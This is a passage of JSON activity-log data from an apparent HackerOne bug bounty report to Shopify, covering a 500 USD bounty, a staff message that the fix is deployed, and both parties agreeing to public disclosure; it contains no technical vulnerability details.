resolved.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-05-13T16:17:43.324Z","updated_at":"2019-05-13T16:17:43.324Z","actor":{"url":"/shopify","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Shopify"}},"bounty_amount":"500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"shopify","collaborator":{"username":"yxw21","url":"/yxw21"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5005522,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hi @wxy7174,\n\nWe've deployed a fix for this issue and it should no longer be reproducible.\nWe believe the initial bounty amount is appropriate for this report.\n\nThanks again for making Shopify more secure!","markdown_message":"\u003cp\u003eHi \u003ca href=\"/wxy7174\"\u003e@wxy7174\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eWe\u0026#39;ve deployed a fix for this issue and it should no longer be reproducible.\u003cbr\u003e\nWe believe the initial bounty amount is appropriate for this report.\u003c/p\u003e\n\n\u003cp\u003eThanks again for making Shopify more secure!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-05T14:34:20.283Z","updated_at":"2019-06-05T14:34:20.283Z","actor":{"username":"steven_zhao","cleared":false,"url":"/steven_zhao","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/606/114/a1238785f1096f1fa26d850510a73ec978b4058f_original.JPG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"yxw21","url":"/yxw21"},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5008810,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-06-05T19:54:41.011Z","updated_at":"2019-06-05T19:54:41.011Z","first_to_agree":true,"actor":{"username":"shopify-peteryaworski","cleared":false,"url":"/shopify-peteryaworski","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/175/526/7ba4844078e290c91c4c46a345b4f9e7666f3ed4_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5010975,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-06-05T23:24:37.403Z","updated_at":"2019-06-05T23:24:37.403Z","actor":{"username":"yxw21","cleared":true,"url":"/yxw21","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/151/364/0a7059a81613b7eeb842c0ce8d84ee7777e97326_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5010976,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-06-05T23:24:37.492Z","updated_at":"2019-06-05T23:24:37.492Z","actor":{"username":"yxw21","cleared":true,"url":"/yxw21","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/151/364/0a7059a81613b7eeb842c0ce8d84ee7777e97326_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}